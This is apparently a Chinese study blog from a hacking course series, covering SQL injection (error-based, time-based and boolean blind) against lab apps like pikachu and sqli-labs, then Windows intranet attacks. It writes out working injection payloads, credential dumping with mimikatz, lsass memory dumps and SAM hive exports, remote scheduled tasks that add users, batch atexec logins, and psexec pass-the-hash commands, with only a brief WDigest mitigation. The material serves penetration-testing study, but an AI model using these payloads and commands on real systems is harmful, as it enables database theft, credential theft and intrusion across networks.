<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">update</span> 更新数据<br><br>会员或后台中心数据同步或缓存等操作<br>例：<span class="hljs-keyword">update</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">set</span> pwd<span class="hljs-operator">=</span><span class="hljs-string">&#x27;$p&#x27;</span> <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">and</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;admin&#x27;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> 排列数据<br><br>一般结合表名或列名进行数据排序操作<br>例：<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> news <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> $id<br>例：<span class="hljs-keyword">select</span> id,name,price <span class="hljs-keyword">from</span> news <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> $<span class="hljs-keyword">order</span><br></code></pre></td></tr></table></figure>

<h3><span id="11burp抓包报错注入">1.1burp抓包报错注入</span></h3><p><strong>floor</strong></p>
<p><strong>payload：</strong></p>
<h4><span id="insert插入">insert插入</span></h4><p><img src="/../../images/xdsql/1650345536473.png" alt="1650345536473"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">username=x<br><span class="hljs-string">&#x27; or(select 1 from(select count(*),concat((select(select (select  concat(0x7e,database(),0x7e))) from  information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or &#x27;</span><br>&amp;password=xiaodi&amp;sex=%E7%<span class="hljs-number">94</span>%B7&amp;phonenum=<span class="hljs-number">13878787788</span>&amp;email=wuhan&amp;add=hubei &amp;submit=submit<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/xdsql/1650345778908.png" alt="1650345778908"></p>
<h4><span id="updatexml-更新"><strong>updatexml 更新</strong></span></h4><p><img src="/../../images/xdsql/1650345983451.png" alt="1650345983451"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">username=x <span class="hljs-string">&#x27; or updatexml(1,concat(0x7e,(version())),0) or &#x27;</span> &amp; password=xiaodi &amp;                 sex=%E7%<span class="hljs-number">94</span>%B7 &amp; honenum=<span class="hljs-number">13878787788</span> &amp; email=wuhan &amp; add=hubei &amp; submit=submit<br></code></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">sex=%E7%<span class="hljs-number">94</span>%B7&amp;phonenum=<span class="hljs-number">13878787788</span>&amp;<span class="hljs-keyword">and</span>=hubeNicky<span class="hljs-string">&#x27; or (select 1 </span><br><span class="hljs-string">from(select count(*),concat(floor(rand(0)*2),0x7e,   (database()),0x7e)x from</span><br><span class="hljs-string"> information_schema.character_sets group by  x)a) or &#x27;</span>&amp;email=wuhan&amp;submit=submit<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/xdsql/1650346069831.png" alt="1650346069831"></p>
<h4><span id="delete删除">delete删除</span></h4><p><img src="/../../images/xdsql/1650346510216.png" alt="1650346510216"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">/pikachu/vul/sqli/sqli_del.php?id=<span class="hljs-number">56</span>+<span class="hljs-keyword">or</span>+updatexml+(<span class="hljs-number">1</span>,<span class="hljs-title function_ invoke__">concat</span>(<span class="hljs-number">0x7e</span>,<span class="hljs-title function_ invoke__">database</span>()),<span class="hljs-number">0</span>)<br>    <br>/pikachu/vul/sqli/sqli_del.php?id=<span class="hljs-number">56</span>+<span class="hljs-keyword">or</span>+extractvalue+(<span class="hljs-number">1</span>,<span class="hljs-title function_ invoke__">concat</span>(<span class="hljs-number">0x7e</span>,<span class="hljs-title function_ invoke__">database</span>()))<br></code></pre></td></tr></table></figure>



<p><img src="/../../images/xdsql/1650346495564.png" alt="1650346495564"></p>
<h3><span id="12报错注入利用手工">1.2报错注入利用（手工）</span></h3><p>发现注入漏洞时，构造sql语句不回显类容，但是会打印报错语句</p>
<p>目的：让错误信息返回数据库中的类容</p>
<p>原理分析：</p>
<ul>
<li><p><strong>floor()</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">首先我们探讨一下是什么导致了报错，真是floor（）这个函数吗？<br>floor这个函数，它的作用是返回参数的最小整数。也就是向下取整（2.2 ==》）。很显然这个函数不可能导致报错。再者count（*）就是一个计数的函数，也不是。其实真正发生作用的是第二层括号里面的代码<br><br>select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x<br><br>Mysql在执行 select count() from XXX group by x这一类语句时会先创建一个虚拟表，然后在虚拟表中插入数据，key是主键，不可重复。记住，不可重复，这个是重点。key就是后面那个x<br>假设我们现在有这样一个表<br></code></pre></td></tr></table></figure>

<p>使用 group by 对一些rand()函数进行操作时会返回重复键</p>
<p>（duplicate key）错误</p>
<p>向下取整：省略小数点后的数，不会四舍五入</p>
<p><img src="/../../images/xdsql/1.png" alt="1646477221722"></p>
<p>rand:产生尾随机数的序列，随机产生一个0-1之间的数</p>
</li>
</ul>
<p>不加参数每次执行都是不一样的结果，加参数每次执行都是一样的结果</p>
<ul>
<li><p>count (*)</p>
<p>对数据计数</p>
<p><img src="/../../images/xdsql/3.png" alt="1646475156026"></p>
</li>
<li><p>group by </p>
<p>分组</p>
<p><img src="/../../images/xdsql/4.png" alt="1646475534047"></p>
</li>
</ul>
<p><strong>count(<em>)和group by 特性：count(</em>)和group by在执行的时候会创建虚拟表，虚拟表用来处理数据，计数</strong></p>
<ol>
<li>获取数据库名</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and(select 1 from(select count(*),concat((select database() from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/xdsql/5.png" alt="1646480666891"></p>
<ol start="2">
<li>爆表名</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and (select 1 from(select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/xdsql/6..png" alt="1646480854172"></p>
<ol start="3">
<li>爆字段</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and (select 1 from (select count(*),concat((select (column_name) from information_schema.columns where table_schema=database() and table_name= &#x27;users&#x27; limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/xdsql/7.png" alt="1646481042045"></p>
<ol start="4">
<li>爆字段数据</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and (select 1 from (select count(*),concat((select username from users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/xdsql/84.png" alt="1646481199468"></p>
<h3><span id="2延迟盲注">2.延迟盲注</span></h3><p><strong>判断目标是否真的存在注入点，我们可以加单引号，双引号，减号 等干扰字符来确定输入的参数是否能代入数据库中，但是如果不管输入什么不管怎么闭合，前端页面都是显示正常，那么这时候时间盲注应运而生</strong></p>
<p><strong>来到sqlilabs的第九关，当我们在url上输入任何参数返回页面都返回正常</strong></p>
<p><img src="/../../images/xdsql/1650420493020.png" alt="1650420493020"></p>
<blockquote>
<p><strong>延时盲注： 利用 and 链接正确语句，让if判断脚本对错，两个联合起来再通过时间来给出反馈，判断脚本是否执行正确。 利用 and 链接正确语句，让if判断脚本对错，两个联合起来再通过时间来给出反馈，判断脚本是否执行正确。</strong></p>
</blockquote>
<p>使用if语句，通过观察来判断输入的数据是否被代入到数据库中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and if(1=1,sleep(5),1)--+<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/xdsql/1650420643352.png" alt="1650420643352"></p>
<p>判断数据库长度</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?id=1&#x27; and if(length(database())=8,sleep(2),0) --+<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/xdsql/1650421647130.png" alt="1650421647130"></p>
<p>获取数据库名：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?id=1&#x27; and if ((ascii(mid((select database()),1,1))=115),sleep(5),1)--+<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/xdsql/1650421393363.png" alt="1650421393363"></p>
<p>延迟手工盲注CSDN博主：<a href="https://blog.csdn.net/qq_51954912/article/details/116100446?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165042150116782092970289%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=165042150116782092970289&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-116100446.142%5Ev9%5Epc_search_result_cache,157%5Ev4%5Econtrol&utm_term=%E5%BB%B6%E8%BF%9F%E6%B3%A8%E5%85%A5%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%90%8D%E7%A7%B0&spm=1018.2226.3001.4187">延迟手工注入</a></p>
<h3><span id="3布尔盲注">3.布尔盲注</span></h3><blockquote>
<p><strong>目标网站即使存在注入，也没有任何的回显，不管怎样改变参数，就是页面没有变化，对于这种情况，我们可以通过布尔盲注要么返回要么不返回的两种状态的改变来判断我们想要的结果</strong></p>
<p><strong>例如：语句是被带入到数据库执行，但是在页面上看不到任何的信息</strong></p>
</blockquote>
<p><img src="/../../images/xdsql/15.png" alt="1646236190924"></p>
<p><strong>开始注入演示</strong>：</p>
<p>函数：</p>
<ul>
<li><p>判断长度函数：length</p>
</li>
<li><p>判断数据库名&gt;&#x3D;&lt;某值</p>
</li>
<li><p>将字符传换成Ascii</p>
</li>
<li><p>通过length函数来判断数据库名长度</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?id=1&#x27; and (length(database()))&gt;7--+<br></code></pre></td></tr></table></figure>



<p><img src="/../../images/xdsql/16.png" alt="1646237125455"></p>
<ul>
<li>获取数据库名字</li>
</ul>
<p>substr(database(),1,a)从数据库名字的第一个开始取第a个</p>
<p><img src="/../../images/xdsql/17..png" alt="1646237780843"></p>
<ol>
<li>使用ASCLL将字符转换成数字比较</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?id=1&#x27; and ascii(substr(database(),1,1))=115--+<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/xdsql/19.png" alt="1646238250232"></p>
<ul>
<li>获取表名字</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and (select ascii(substr(table_name,1,1)) from information_schema.tables where table_schema=database() limit 0,1)=101--+<br><br>table_name,1,1表示第一个字母<br>limit，0，1表示第一个表<br></code></pre></td></tr></table></figure>

<p><strong>注：获取完一个表名，可以设置limit切换下个表</strong></p>
<p><img src="/../../images/xdsql/21.png" alt="1646285143209"></p>
<p><img src="/../../images/xdsql/1650424753737.png" alt="1650424753737"></p>
<ul>
<li><strong>判断表长度</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?id=1&#x27; and (select length(table_name) from information_schema.tables where table_schema=database() limit 1,1)=8--+<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/xdsql/1650425134822.png" alt="1650425134822"></p>
<h3><span id="burp获取表名信息">Burp获取表名信息</span></h3><p>在实际的 WEB渗透中如果目标存在布尔注入，我们在url地址上一个个的测试是非常的麻烦，效率很低的。，所以使用<strong>Burp</strong>的<strong>Intruder</strong>来猜解信息是一个不错的选择</p>
<p>使用Burp获取表名：</p>
<ol>
<li>先抓一个包，然后发送给给Intruder模块</li>
</ol>
<p><img src="/../../images/xdsql/22.png" alt="1646384318158"></p>
<ol start="2">
<li>Intruder配置</li>
</ol>
<p><img src="/../../images/xdsql/23.png" alt="1646384375603"></p>
<ol start="3">
<li>设置变量符号</li>
</ol>
<p><img src="/../../images/xdsql/24.png" alt="1646384978480"></p>
<ol start="4">
<li>设定类型以及范围</li>
</ol>
<p><img src="/../../images/xdsql/25.png" alt="1646385182573"></p>
<ol start="5">
<li>设定好后就可以开始攻击了</li>
</ol>
<p><img src="/../../images/xdsql/126.png" alt="1646385233286"></p>
<ol start="6">
<li><p>开始扫描后，Burp会从0-127依次尝试，当页面回显正常，就会被burp识别，一个个的尝试，最终获取完整表名</p>
<p><strong>注：如果找不到，点击length排序一下</strong></p>
</li>
</ol>
<p><img src="/../../images/xdsql/27.png" alt="1646389674912"></p>
<h1><span id="九扩展注入">九：扩展注入</span></h1><h3><span id="1-二次注入">1. 二次注入</span></h3><h3><span id="2-加解密注入">2. 加解密注入</span></h3><h3><span id="3-dns注入">3. DNS注入</span></h3><h3><span id="4-堆叠注入">4. 堆叠注入</span></h3><h3><span id="5-cookie注入">5. COOKiE注入</span></h3><h3><span id="6-http头注入">6. HTTP头注入</span></h3><h3><span id="7宽字节注入">7.宽字节注入</span></h3><h1><span id="十sqlmap注入">十：SQLmap注入</span></h1><h1><span id="十一waf绕过">十一：WAF绕过</span></h1>]]></content>
      <categories>
        <category>小迪安全</category>
      </categories>
  </entry>
  <entry>
    <title>小迪安全系列-[内网渗透]</title>
    <url>/2022/05/01/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%5D%20/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1><span id="一-环境amp工作组amp局域网探针方案">一. 环境&amp;工作组&amp;局域网探针方案</span></h1><p>域环境&amp;工作组&amp;局域网探针方案</p>
<p>DMZ:把一些不得不向外部提供服务的东西单独放在DMZ中，核心设备才放在内网，一把拿到WEB服务权限之后，还要突破DMZ的防火墙，加大了攻击的难度</p>
<p><img src="/../../images/xdnwaq/1639281698075.png" alt="1639281698075"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#案例 1-基本信息收集操作演示<br>旨在了解当前服务器的计算机基本信息，为后续判断服务器角色，网络环境等做准备<br>systeminfo 详细信息<br>net start 启动服务<br>tasklist 进程列表<br>schtasks 计划任务<br></code></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#案例 2-网络信息收集操作演示<br>旨在了解当前服务器的网络接口信息，为判断当前角色，功能，网络架构做准备<br>1.ipconfig /all 判断存在域-dns<br>net view /domain 判断存在域<br>net time /domain 判断主域<br>netstat -ano 当前网络端口开放<br>nslookup 域名 追踪来源地址<br></code></pre></td></tr></table></figure>





<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#案例 3-用户信息收集操作演示<br>旨在了解当前计算机或域环境下的用户及用户组信息，便于后期利用凭据进行测试<br>系统默认常见用户身份：<br>Domain Admins：域管理员（默认对域控制器有完全控制权）<br>Domain Computers：域内机器<br>Domain Controllers：域控制器<br>Domain Guest：域访客，权限低<br>Domain Users：域用户<br>Enterprise Admins：企业系统管理员用户（默认对域控制器有完全控制权）<br>相关用户收集操作命令：<br>whoami /all 用户权限<br>net config workstation 登录信息<br>net user 本地用户<br>net localgroup 本地用户组<br>net user /domain 获取域用户信息<br>net group /domain 获取域用户组信息<br>wmic useraccount get /all 涉及域用户详细信息<br>net group &quot;Domain Admins&quot; /domain 查询域管理员账户<br>net group &quot;Enterprise Admins&quot; /domain 查询管理员用户组<br>net group &quot;Domain Controllers&quot; /domain 查询域控制器<br></code></pre></td></tr></table></figure>





<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#案例 4-凭据信息收集操作演示<br>旨在收集各种密文，明文，口令等，为后续横向渗透做好测试准备<br>计算机用户 HASH，明文获取-mimikatz(win)，mimipenguin(linux)<br>计算机各种协议服务口令获取-LaZagne(all)，XenArmor(win)<br>Netsh WLAN show profiles<br>Netsh WLAN show profile name=&quot;无线名称&quot; key=clear<br>1.站点源码备份文件、数据库备份文件等<br>2.各类数据库 Web 管理入口，如 PHPMyAdmin<br>3.浏览器保存密码、浏览器 Cookies<br>4.其他用户会话、3389 和 ipc$连接记录、回收站内容<br>5.Windows 保存的 WIFI 密码<br>6.网络内部的各种帐号和密码，如：Email、VPN、FTP、OA 等<br><br></code></pre></td></tr></table></figure>





<ul>
<li>ipconfig &#x2F;all 判断存在域-dns</li>
</ul>
<p><img src="/../../images/xdnwaq/1639294767368.png" alt="1639294767368"></p>
<ul>
<li>net time &#x2F;domain 判断主域</li>
</ul>
<p><img src="/../../images/xdnwaq/1639295816512.png" alt="1639295816512"></p>
<ul>
<li>netstat -ano 当前网络端口开放</li>
</ul>
<p><img src="/../../images/xdnwaq/163929592335397.png" alt="1639295925397"></p>
<ul>
<li><strong>收集域中的用户是为了获取用户名在那个组里面，享有那些权限，为后续密码攻击的手法做准备</strong></li>
</ul>
<p><img src="/../../images/xdnwaq/1639296689238.png" alt="1639296689238"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#案例 5-探针主机域控架构服务操作演示<br>为后续横向思路做准备，针对应用，协议等各类攻击手法<br>探针域控制器名及地址信息<br>net time /domain nslookup ping<br>探针域内存活主机及地址信息<br>nbtscan 192.168.3.0/24 第三方工具<br></code></pre></td></tr></table></figure>



<h2><span id="探测存活主机">探测存活主机</span></h2><h2><span id="命令">命令</span></h2><ul>
<li>系统自带命令探测存活主机</li>
</ul>
<p> for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr “TTL&#x3D;” 自带内部命令  </p>
<p><img src="/../../images/xdnwaq/1639408618449.png" alt="1639408618449"></p>
<p> nmap masscan 第三方 PowerShell 脚本 nishang empire 等 </p>
<h2><span id="nishang">nishang</span></h2><p>Nishang下载地址：<a href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1.#导入模块 nishang<br>Import-Module .\nishang.psm1<br><br>2.#设置执行策略<br>Set-ExecutionPolicy RemoteSigned<br><br>3.#获取模块 nishang 的命令函数<br>Get-Command -Module nishang<br><br>4.#获取常规计算机信息<br>Get-Information<br><br>5.#端口扫描（查看目录对应文件有演示语法，其他同理）<br>Invoke-PortScan -StartAddress 192.168.3.0 -EndAddress 192.168.3.100 -ResolveHost -ScanPort<br>#其他功能：删除补丁，反弹 Shell，凭据获取等<br><br></code></pre></td></tr></table></figure>

<p>2.#设置执行策略出现访问被拒绝因为权限不足<br>Set-ExecutionPolicy RemoteSigned</p>
<p><img src="/../../images/xdnwaq/1639411537057.png" alt="1639411537057"></p>
<p>有权限</p>
<p><img src="/../../images/xdnwaq/1639411593003.png" alt="1639411593003"></p>
<h2><span id="获取密码">获取密码</span></h2><h2><span id="minikatz">Minikatz</span></h2><p>下载：<a href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p>
<p>1.提权：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">mimikatz # privilege::debug<br>Privilege &#x27;20&#x27; OK<br></code></pre></td></tr></table></figure>



<p>2.获取用户&#x2F;密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">mimikatz # sekurlsa::logonpasswords<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/xdnwaq/1639809492888.png" alt="1639809492888"></p>
<h1><span id="二域横向atampschtasksampimpacket">二,域横向at&amp;schtasks&amp;impacket</span></h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#案例 1-横向渗透明文传递 at&amp;schtasks<br>在拿下一台内网主机后，通过本地信息搜集收集用户凭证等信息后，如何横向渗透拿下更多的主机？<br>这里仅介绍 at&amp;schtasks 命令的使用，在已知目标系统的用户明文密码的基础上，直接可以在远程主<br>机上执行命令。<br>获取到某域主机权限-&gt;minikatz 得到密码（明文，hash）-&gt;用到信息收集里面域用户的列表当做用户<br>名字典-&gt;用到密码明文当做密码字典-》尝试连接-&gt;创建计划任务(at|schtasks)-&gt;执行文件可为后门或<br>者相关命令<br>利用流程<br>1. 建立 IPC 链接到目标主机<br>2. 拷贝要执行的命令脚本到目标主机<br>3. 查看目标时间，创建计划任务（at、schtasks）定时执行拷贝到的脚本<br></code></pre></td></tr></table></figure>







<h2><span id="计划任务at">计划任务——AT</span></h2><p>注：at命令仅仅适用于win8以下系统，win8和win8以上已弃用</p>
<p>1.创建本地IPC链接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">net use \\192.168.3.21\ipc$ Admin12345 /user:administrator<br></code></pre></td></tr></table></figure>

<p>2.拷贝要执行的命令脚本到目标主机</p>
<p><img src="/../../images/xdnwaq/d1639495713473.png" alt="1639495713473"></p>
<p>3.查看目标时间，创建计划任务（at、schtasks）定时执行拷贝到的脚本</p>
<p><img src="/../../images/xdnwaq/16394957436174.png" alt="1639495736174"></p>
<h2><span id="计划任务schtasks">计划任务——schtasks</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#schtasks &gt;=Windows2012<br>net use \\192.168.3.32\ipc$ &quot;admin!@#45&quot; /user:god.org\ad<br>ministrator # 建立 ipc 连接：<br>copy add.bat \\192.168.3.32\c$ #复制文件到其 C 盘<br>schtasks /create /s 192.168.3.32 /ru &quot;SYSTEM&quot; /tn adduser /sc DAILY /tr c:\add.bat /F #创建 adduser 任务<br>对应执行文件<br>schtasks /run /s 192.168.3.32 /tn adduser /i #运行 adduser 任务<br>schtasks /delete /s 192.168.3.21 /tn adduser /f#删除 adduser 任务<br></code></pre></td></tr></table></figure>

<p>1.创建任务</p>
<p>schtasks &#x2F;create &#x2F;s 192.168.1.146 &#x2F;ru “SYSTEM” &#x2F;tn adduser &#x2F;sc DAILY &#x2F;tr c:\add.bat &#x2F;F </p>
<p>&#x2F;ru “SYSTEM”                        权限</p>
<p> &#x2F;tn adduser                        计时任务的名字 </p>
<p>&#x2F;sc DAILY &#x2F;tr c:\add.bat     延迟执行文件地址</p>
<p><img src="/../../images/xdnwaq/16394986174427.png" alt="1639498617427"></p>
<p>2.运行adduser 任务</p>
<p>schtasks &#x2F;run &#x2F;s 192.168.3.32 &#x2F;tn adduser &#x2F;i</p>
<p><img src="/../../images/xdnwaq/16394984666812.png" alt="1639498666812"></p>
<p>3.删除add user任务</p>
<p> schtasks &#x2F;delete &#x2F;s 192.168.3.21 &#x2F;tn adduser &#x2F;f#删除 adduser 任务 </p>
<h2><span id="atexec-impacket">atexec-impacket</span></h2><p><strong>atexec.exe [用户名] ：[密码] @ [IP] [命令]</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">atexec.exe ./administrator:Admin12345@192.168.3.21 &quot;whoami&quot;<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/xdnwaq/16395840214846.png" alt="1639584021846"></p>
<h2><span id="atexecexe批量连接"><strong>atexec.exe批量连接</strong></span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">FOR /F %%i in (ips.txt) do atexec.exe ./administrator:admin!@#45@%%i whoami<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/xdnwaq/1651470706485.png" alt="1651470706485"></p>
<h2><span id="net-use批量连接"><strong>net use批量连接</strong></span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">FOR /F %%i in (ips.txt) do net use \\%%i\ipc$ &quot;Admin12345&quot; /user:administrator<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/xdnwaq/1639590175450.png" alt="1639590175450"></p>
<h1><span id="三域横向-smbampwmi-明文或-hash-传递">三,域横向 smb&amp;wmi 明文或 hash 传递</span></h1><p>知识点1:</p>
<blockquote>
<p> <strong>WDigest的问题是它将密码存储在内存中，并且无论是否使用它，都会将其存储在内存中。除非密码以明文保存在内存中，否则WDigest无法正常工作，因此如果使用WDigest，则无法进行修复。以下操作系统受到影响：Windows 7，Windows 8，Windows 8.1，Windows Server 2008，Windows Server 2008R2和Windows Server 2012。</strong> </p>
</blockquote>
<blockquote>
<p><strong>windows2012以上版本默认关闭wdigest，攻击者无法从内存中获取明文密码windows2012以下版本如安装KB2871997补丁，同样也会导致无法获取明文密码针对以上情况，我们提供了4种方式解决此类问题</strong></p>
</blockquote>
<p>minikatz+procdump： <a href="https://x1aojun.lanzoub.com/b036ytgba">https://x1aojun.lanzoub.com/b036ytgba</a><br>密码:h4kw </p>
<h2><span id="案例1-procdumpmimikatz-配合获取">案例1-Procdump+Mimikatz 配合获取</span></h2><p> <strong>如果上传Minmiktz上传后被杀,可以使用Procdump+Mimikatz这个方法</strong> </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">procdump 配合 mimikatz<br>procdump -accepteula -ma lsass.exe lsass.dmp<br><br>mimikatz 上执行：<br>sekurlsa::minidump lsass.dmp<br>sekurlsa::logonPasswords full<br>#Pwdump7<br>#QuarksPwdump<br></code></pre></td></tr></table></figure>

<p>一，win7-1运行**<code>procdump -accepteula -ma lsass.exe lsass.dmp</code>**</p>
<p><img src="/../../images/xdnwaq/1640018929439.png" alt="1640018929439"></p>
<p>二，win7-2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">mimikatz 上执行：<br><br>privilege::debug		//提权<br><br>sekurlsa::minidump lsass.dmp<br>sekurlsa::logonPasswords full<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/xdnwaq/1640019069996.png" alt="1640019069996"></p>
<h2><span id="案例2-通过sam和system文件抓取密码和hash">案例2 通过SAM和System文件抓取密码和Hash</span></h2><p>一，首先利用注册表命令将目标机的sam或者system文件导出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">reg save hklm\sam sam.hive<br><br>reg save hklm\system system.hive<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/xdnwaq/16400194670596.png" alt="1640019460596"></p>
<p>二，然后将目标机上的sam.hive和system.hive下载到本地，利用Mimikatz读取sam和system文件获取NTLMHash：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">token::elevate<br><br>lsadump::sam<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/xdnwaq/1640019523652.png" alt="1640019523652"></p>
<p>三，<a href="https://www.objectif-securite.ch/en/ophcrack">https://www.objectif-securite.ch/en/ophcrack</a> <strong>在线破解HASH</strong>(挂了) 再通过以上工具获取到密码Hash后，我们需要对其进行破解，以得到明文密码。Ophcrack网站<a href="https://www.objectif-securite.ch/en/ophcrack%E6%8F%90%E4%BE%9B%E4%BA%86%E5%9C%A8%E7%BA%BFHash%E7%A0%B4%E8%A7%A3%E6%9C%8D%E5%8A%A1%EF%BC%8C%E6%88%91%E4%BB%AC%E5%B0%86%E5%BE%97%E5%88%B0%E7%9A%84NTLM">https://www.objectif-securite.ch/en/ophcrack提供了在线Hash破解服务，我们将得到的NTLM</a> Hash输入到第一个查询框内，点击GO即可进行破解，小于14位的密码一般在几分钟内就可以破解完成： </p>
<p><img src="/../../images/xdnwaq/1640019667156.png" alt="1640019667156"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">防范措施<br>1、更新补丁<br>微软为了防止用户的明文密码在内存中泄露，发布了KB2871997补丁，关闭了Wdigest功能。Windows Server 2012及以上版本默认关闭Wdigest，使攻击者无法从内存中获取明文密码。Windows Server 2012以下版本，如果安装了KB2871997补丁，攻击者同样无法获取明文密码。<br>2、关闭Wdigest Auth<br>如果无法更新补丁，需要手动关闭Wdigest Auth，在CMD中输入以下命令：<br>reg add HKLM\SYSTEM\CurrentControlSet\<br>Control\SecurityProviders\WDigest /vUseLogonCredential /t REG_DWORD /d0/f //关闭Wdigest Auth<br>需要将UseLogonCredential的值设为0，然后注销当前用户，重新登陆即可。<br></code></pre></td></tr></table></figure>





<h2><span id="案例-3-域横向移动-smb-服务利用psexecsmbexec官方自带">案例 3-域横向移动 SMB 服务利用psexec,smbexec(官方自带)</span></h2><p>利用 SMB 服务可以通过明文或 hash 传递来远程执行，条件 445 服务端口开放 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">第一种：先有 ipc 链接，psexec 需要明文或 hash 传递<br>net use \\192.168.3.32\ipc$ &quot;admin&quot; /user:administrator<br>psexec \\192.168.3.32 -s cmd # 需要先有 ipc 链接 -s 以 System 权限运行<br><br>第二种：不用建立 IPC 直接提供明文账户密码<br>psexec \\192.168.3.21 -u administrator -p Admin12345 -s cmd<br>psexec -hashes :209c6174da490caeb422f3Fa5a7ae634 ./administrator@192.168.0.2<br>psexec -hashes :$HASH$ domain/administrator@10.1.2.3<br>psexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 官方 Pstools 无法<br>采用 hash 连接<br>#非官方自带-参考 impacket 工具包使用，操作简单，容易被杀<br></code></pre></td></tr></table></figure>



<h2><span id="ps-toolspsexecexe">PS tools——PsExec.exe</span></h2><p><img src="/../../images/xdnwaq/1640021849986.png" alt="1640021849986"></p>
